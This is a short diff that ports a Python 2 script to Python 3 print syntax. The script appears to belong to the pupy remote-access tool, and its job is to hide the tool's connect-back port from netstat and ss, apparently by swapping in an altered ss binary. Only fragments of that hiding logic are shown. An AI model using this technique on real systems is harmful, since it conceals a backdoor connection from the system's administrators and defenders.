@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 
+from __future__ import print_function
 import subprocess
 import os
 import time
@@ -13,7 +14,7 @@ def run(port=None):
         except:
             raise Exception("pupy connect back port couldn't be found, please precise it manually")
 
-    print "hidding port %s ..."%port
+    print("hidding port %s ..."%port)
 
     a=subprocess.check_output(["netstat", "-tn"])
     if port in a:
@@ -46,4 +47,4 @@ def run(port=None):
             newss.close()
         os.system("chmod +x "+path+"ss")
     else:
-        print "port is already hidden"
+        print("port is already hidden")
